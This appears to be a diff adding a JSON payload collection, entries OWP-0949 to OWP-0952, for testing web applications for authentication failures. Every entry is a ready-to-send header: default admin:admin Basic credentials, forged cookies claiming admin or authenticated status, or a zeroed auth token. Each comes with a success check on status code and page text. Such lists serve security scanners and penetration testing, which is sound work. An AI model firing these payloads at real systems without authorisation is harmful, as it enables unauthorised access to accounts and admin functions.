@@ -1,0 +1,46 @@
+[
+  {
+    "payload_id": "OWP-0949",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Web Application",
+    "injection_point": "header",
+    "payload_string": "Authorization: Basic YWRtaW46YWRtaW4=",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  },
+  {
+    "payload_id": "OWP-0950",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Web Application",
+    "injection_point": "header",
+    "payload_string": "Cookie: admin=true; role=admin",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  },
+  {
+    "payload_id": "OWP-0951",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Web Application",
+    "injection_point": "header",
+    "payload_string": "Cookie: authenticated=yes; isAdmin=1",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  },
+  {
+    "payload_id": "OWP-0952",
+    "vulnerability_category": "Identification & Authentication Failures",
+    "target_technology": "Web Application",
+    "injection_point": "header",
+    "payload_string": "X-Auth-Token: 0000000000000000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "admin|welcome"
+    }
+  }
+]
